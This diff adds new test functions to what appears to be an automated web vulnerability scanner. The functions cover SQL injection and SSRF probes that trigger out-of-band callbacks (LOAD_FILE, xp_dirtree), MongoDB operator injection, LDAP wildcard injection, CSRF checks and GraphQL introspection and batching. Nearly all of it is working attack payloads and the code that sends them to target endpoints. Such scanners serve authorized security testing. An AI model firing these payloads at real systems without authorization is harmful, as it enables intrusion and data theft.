@@ -2411,6 +2411,83 @@ async def test_sqli_time_advanced(pool, endpoint, params, oast=None):
     return findings
 
 
+async def test_sqli_oast(pool, endpoint, params, oast):
+    """SQLi via OAST - blind detection through callbacks."""
+    from urllib.parse import quote
+    import asyncio as _a
+    findings = []
+    if not oast or not params:
+        return findings
+    payload_url = oast.get_payload_url()
+    PAYLOADS = []
+    PAYLOADS.append("1" + chr(39) + " AND LOAD_FILE(" + chr(39) + payload_url + chr(39) + ")-- -")
+    PAYLOADS.append("1" + chr(39) + " UNION SELECT LOAD_FILE(" + chr(39) + payload_url + chr(39) + ")-- -")
+    PAYLOADS.append("1; EXEC master..xp_dirtree " + chr(39) + payload_url + chr(39) + "-- -")
+    for param in params:
+        for payload in PAYLOADS:
+            try:
+                test_url = endpoint + "?" + param + "=" + quote(payload, safe="")
+                await pool.send("GET", test_url)
+            except Exception:
+                continue
+    for _ in range(8):
+        await _a.sleep(0.5)
+        if oast.callbacks:
+            break
+    if oast.callbacks:
+        findings.append({
+            "vuln_class": "sqli",
+            "subtype": "oast_blind",
+            "severity": "critical",
+            "url": endpoint,
+            "injected_url": endpoint,
+            "param": params[0] if params else "",
+            "payload": "OAST callback",
+            "evidence": "OAST received " + str(len(oast.callbacks)) + " callbacks",
+            "confidence": 0.95,
+        })
+        log.info("sqli_oast_confirmed", callbacks=len(oast.callbacks))
+    return findings
+
+
+async def test_ssrf_oast_advanced(pool, endpoint, params, oast):
+    """Advanced SSRF via OAST."""
+    from urllib.parse import quote
+    import asyncio as _a
+    findings = []
+    if not oast or not params:
+        return findings
+    payload_url = oast.get_payload_url()
+    PAYLOADS = [
+        payload_url,
+        payload_url.replace("http://", "http://127.0.0.1@"),
+    ]
+    for param in params:
+        for payload in PAYLOADS:
+            try:
+                test_url = endpoint + "?" + param + "=" + quote(payload, safe="")
+                await pool.send("GET", test_url)
+            except Exception:
+                continue
+    for _ in range(8):
+        await _a.sleep(0.5)
+        if oast.callbacks:
+            break
+    if oast.callbacks:
+        findings.append({
+            "vuln_class": "ssrf",
+            "subtype": "oast_ssrf",
+            "severity": "critical",
+            "url": endpoint,
+            "injected_url": endpoint,
+            "param": params[0] if params else "",
+            "payload": payload_url,
+            "evidence": "OAST received " + str(len(oast.callbacks)) + " callbacks",
+            "confidence": 0.95,
+        })
+        log.info("ssrf_oast_confirmed", callbacks=len(oast.callbacks))
+    return findings
+
 async def test_sqli(pool, endpoint, params):
     """Test for SQL injection (error-based + time-based)."""
     error_payloads = [
@@ -3081,6 +3158,50 @@ async def test_idor(pool, endpoints, session_a=None, session_b=None):
                 break
     return findings
 
+
+async def test_csrf_advanced(pool, target):
+    """Advanced CSRF: SameSite + token bypass."""
+    import re as _re
+    findings = []
+    resp = await pool.send("GET", target)
+    if not resp or resp.status == 0:
+        return findings
+    hdrs = {k.lower(): (v or "") for k, v in (resp.headers or {}).items()}
+    set_cookie = hdrs.get("set-cookie", "").lower()
+    has_samesite = "samesite" in set_cookie
+    if not has_samesite:
+        findings.append({
+            "vuln_class": "csrf",
+            "subtype": "no_samesite_cookie",
+            "severity": "medium",
+            "url": target,
+            "injected_url": target,
+            "param": "Set-Cookie",
+            "payload": "",
+            "evidence": "No SameSite cookie attribute detected",
+            "confidence": 0.7,
+        })
+    body = resp.text or ""
+    forms = _re.findall(r"<form[^>]*>(.*?)</form>", body, _re.IGNORECASE | _re.DOTALL)
+    TOKEN_HINTS = ["csrf", "xsrf", "_token", "authenticity_token", "nonce", "requestverificationtoken"]
+    for i, form_body in enumerate(forms[:10]):
+        form_lower = form_body.lower()
+        has_token = any(h in form_lower for h in TOKEN_HINTS)
+        is_state_changing = any(x in form_lower for x in ["password", "email", "username", "delete", "update", "profile"])
+        if is_state_changing and not has_token:
+            findings.append({
+                "vuln_class": "csrf",
+                "subtype": "missing_token",
+                "severity": "medium",
+                "url": target,
+                "injected_url": target,
+                "param": "form_" + str(i + 1),
+                "payload": "",
+                "evidence": "Form " + str(i + 1) + " missing CSRF token",
+                "confidence": 0.7,
+            })
+    log.info("csrf_advanced_complete", findings=len(findings))
+    return findings
 
 async def test_csrf(pool, forms):
     """Test for CSRF - check for missing CSRF tokens in forms."""
@@ -4281,6 +4402,48 @@ async def test_sqli_with_waf_bypass(pool, endpoint, params, waf_detected=False):
 # Stage 9: NoSQL / MongoDB / GraphQL / LDAP / XXE-OOB
 # ============================================================
 
+async def test_nosql_advanced(pool, endpoint, params=None):
+    """Advanced NoSQL injection: MongoDB operators + blind."""
+    from urllib.parse import quote
+    if params is None:
+        params = ["id", "user", "username", "email", "q", "search"]
+    findings = []
+    OPERATORS = [
+        ("[$ne]", "1", "not_equal"),
+        ("[$gt]", "", "greater_than"),
+        ("[$regex]", ".*", "regex_all"),
+        ("[$where]", "1==1", "where_clause"),
+        ("[$exists]", "true", "exists"),
+    ]
+    for param in params:
+        for op, val, subtype in OPERATORS:
+            try:
+                test_url = endpoint + "?" + param + op + "=" + quote(val, safe="")
+                resp = await pool.send("GET", test_url)
+            except Exception:
+                continue
+            if not resp or resp.status == 0:
+                continue
+            body_low = (resp.text or "").lower()
+            indicators = ["mongo", "bson", "unknown operator", "unrecognized",
+                          "cannot apply", "err_client", "cast to objectid"]
+            if any(ind in body_low for ind in indicators):
+                findings.append({
+                    "vuln_class": "nosql",
+                    "subtype": "operator_injection_" + subtype,
+                    "severity": "high",
+                    "url": test_url,
+                    "injected_url": test_url,
+                    "param": param + op,
+                    "payload": op + "=" + val,
+                    "evidence": (resp.text or "")[:300],
+                    "confidence": 0.8,
+                })
+                log.info("nosql_advanced_found", param=param, op=op)
+                break
+    log.info("nosql_advanced_complete", findings=len(findings))
+    return findings
+
 async def test_nosql(pool, endpoints, params=None):
     if params is None:
         params = ["id", "user", "username", "q", "search"]
@@ -4353,6 +4516,55 @@ async def test_mongodb_exposure(pool, base_url):
     return findings
 
 
+async def test_graphql_advanced(pool, target):
+    """Advanced GraphQL: introspection + batch + injection."""
+    findings = []
+    GRAPHQL_PATHS = ["/graphql", "/api/graphql", "/gql", "/query", "/v1/graphql"]
+    for path in GRAPHQL_PATHS:
+        url = target.rstrip("/") + path
+        introspection = '{"query":"{__schema{types{name}}}"}'
+        try:
+            resp = await pool.send("POST", url, content=introspection,
+                headers={"Content-Type": "application/json"})
+        except Exception:
+            continue
+        if not resp or resp.status == 0:
+            continue
+        body = resp.text or ""
+        if "__schema" in body and "types" in body:
+            findings.append({
+                "vuln_class": "graphql",
+                "subtype": "introspection_enabled",
+                "severity": "medium",
+                "url": url,
+                "injected_url": url,
+                "param": "query",
+                "payload": introspection,
+                "evidence": "GraphQL introspection enabled",
+                "confidence": 0.95,
+            })
+            log.info("graphql_introspection_found", url=url)
+        batch = '[{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"}]'
+        try:
+            batch_resp = await pool.send("POST", url, content=batch,
+                headers={"Content-Type": "application/json"})
+            if batch_resp and batch_resp.status == 200 and batch_resp.text.count("__typename") >= 3:
+                findings.append({
+                    "vuln_class": "graphql",
+                    "subtype": "batch_queries_enabled",
+                    "severity": "low",
+                    "url": url,
+                    "injected_url": url,
+                    "param": "batch",
+                    "payload": batch,
+                    "evidence": "GraphQL batch queries enabled",
+                    "confidence": 0.7,
+                })
+        except Exception:
+            pass
+    log.info("graphql_advanced_complete", findings=len(findings))
+    return findings
+
 async def test_graphql(pool, endpoints):
     findings = []
     graphql_paths = ["/graphql", "/api/graphql", "/gql", "/query"]
@@ -4382,6 +4594,70 @@ async def test_graphql(pool, endpoints):
                 continue
     return findings
 
+
+async def test_ldap_advanced(pool, endpoint, params=None):
+    """Advanced LDAP injection (error-based + blind)."""
+    from urllib.parse import quote
+    if params is None:
+        params = ["user", "username", "cn", "uid", "login", "email"]
+    findings = []
+    PAYLOADS = [
+        ("*)(uid=*))(|(uid=*", "classic_wildcard"),
+        ("*)(objectClass=*", "objectclass_wildcard"),
+        ("admin*", "admin_wildcard"),
+        ("*))%00", "null_byte"),
+    ]
+    for param in params:
+        try:
+            base_resp = await pool.send("GET", endpoint + "?" + param + "=test")
+        except Exception:
+            continue
+        if not base_resp or base_resp.status == 0:
+            continue
+        base_len = len(base_resp.text or "")
+        base_status = base_resp.status
+        for payload, subtype in PAYLOADS:
+            try:
+                test_url = endpoint + "?" + param + "=" + quote(payload, safe="")
+                resp = await pool.send("GET", test_url)
+            except Exception:
+                continue
+            if not resp:
+                continue
+            body_low = (resp.text or "").lower()
+            ldap_errors = ["ldap_", "ldaperror", "invalid dn", "javax.naming", "protocol error"]
+            if any(e in body_low for e in ldap_errors):
+                findings.append({
+                    "vuln_class": "ldap",
+                    "subtype": "error_based_" + subtype,
+                    "severity": "high",
+                    "url": test_url,
+                    "injected_url": test_url,
+                    "param": param,
+                    "payload": payload,
+                    "evidence": (resp.text or "")[:300],
+                    "confidence": 0.85,
+                })
+                log.info("ldap_error_found", param=param)
+                break
+            resp_len = len(resp.text or "")
+            if base_len > 0 and abs(resp_len - base_len) > max(50, base_len * 0.3):
+                if resp.status != base_status or resp_len > base_len * 1.5:
+                    findings.append({
+                        "vuln_class": "ldap",
+                        "subtype": "blind_" + subtype,
+                        "severity": "medium",
+                        "url": test_url,
+                        "injected_url": test_url,
+                        "param": param,
+                        "payload": payload,
+                        "evidence": "Baseline=" + str(base_len) + ", injection=" + str(resp_len),
+                        "confidence": 0.65,
+                    })
+                    log.info("ldap_blind_found", param=param)
+                    break
+    log.info("ldap_advanced_complete", findings=len(findings))
+    return findings
 
 async def test_ldap(pool, endpoints, params=None):
     if params is None:
